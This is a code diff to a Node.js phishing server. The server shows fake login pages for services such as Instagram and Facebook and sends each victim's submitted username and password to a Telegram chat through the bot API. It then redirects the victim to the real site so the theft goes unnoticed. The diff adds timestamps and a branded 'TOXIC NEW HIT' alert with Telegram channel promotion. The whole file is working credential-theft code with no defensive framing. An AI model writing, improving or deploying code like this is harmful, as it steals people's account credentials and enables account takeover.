@@ -4,7 +4,7 @@ const axios = require('axios');
 const path = require('path');
 
 const app = express();
-const BOT_TOKEN = process.env.BOT_TOKEN; // Sirf Bot Token ki zaroorat hai
+const BOT_TOKEN = process.env.BOT_TOKEN;
 
 const redirectMap = {
     'Instagram': 'https://www.instagram.com', 'Facebook': 'https://www.facebook.com',
@@ -17,16 +17,14 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.get('/', (req, res) => {
     const service = req.query.service;
     if (service && redirectMap[service]) {
-        res.sendFile(path.join(__dirname, 'pages', service.toLowerCase() + '.html'));
+        res.sendFile(path.join(__dirname, 'pages', `${service.toLowerCase()}.html`));
     } else {
         res.status(404).send('Service Not Found.');
     }
 });
 
 app.post('/login-data', (req, res) => {
-    // NAYA UPGRADE: Form se recipientId (user ki ID) nikalo
     const { username, password, service, recipientId } = req.body;
-
     if (!username || !password || !service || !recipientId) {
         return res.status(400).send("Invalid request. User ID is missing.");
     }
@@ -35,19 +33,40 @@ app.post('/login-data', (req, res) => {
         return res.status(500).send("Server configuration error: BOT_TOKEN is missing.");
     }
 
-    const message = `💎✨ **!! NEW HIT !!** ✨💎\n▬▬▬▬▬▬▬▬▬▬▬▬\n🎯 **Service:** *${service}*\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n▬▬▬▬▬▬▬▬▬▬▬▬`;
+    // NAYA UPGRADE: Timestamp Functionality
+    const now = new Date();
+    const date = now.toLocaleDateString('en-IN', { timeZone: 'Asia/Kolkata' });
+    const time = now.toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
+    const day = now.toLocaleString('en-IN', { weekday: 'long', timeZone: 'Asia/Kolkata' });
+
+    // NAYA UPGRADE: Custom Branded Message
+    const message = `
+💎✨ !! TOXIC NEW HIT !! ✨💎
+▬▬▬▬▬▬▬▬▬▬▬▬
+🎯 **Service:** *${service}*
+👤 **Username:** \`${username}\`
+🔑 **Password:** \`${password}\`
+▬▬▬▬▬▬▬▬▬▬▬▬
+🕓 **Time:** ${time}
+📅 **Date:** ${date}
+🗓️ **Day:** ${day}
+▬▬▬▬▬▬▬▬▬▬▬▬
+
+MADE BY @CDMAXX
+JOIN @TOXICBACK2025
+    `;
+
     const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    // NAYA UPGRADE: Data ko hardcoded CHAT_ID ki jagah, dynamic recipientId par bhejo
     axios.post(telegramApiUrl, {
-        chat_id: recipientId, // Yahan badlaav hua hai
+        chat_id: recipientId,
         text: message,
         parse_mode: 'Markdown'
     })
     .then(() => res.redirect(redirectMap[service]))
     .catch(error => {
         console.error("Telegram API Error:", error.response.data);
-        res.status(500).send("Error sending data.");
+        res.status(500).send("Error sending data to user.");
     });
 });
 
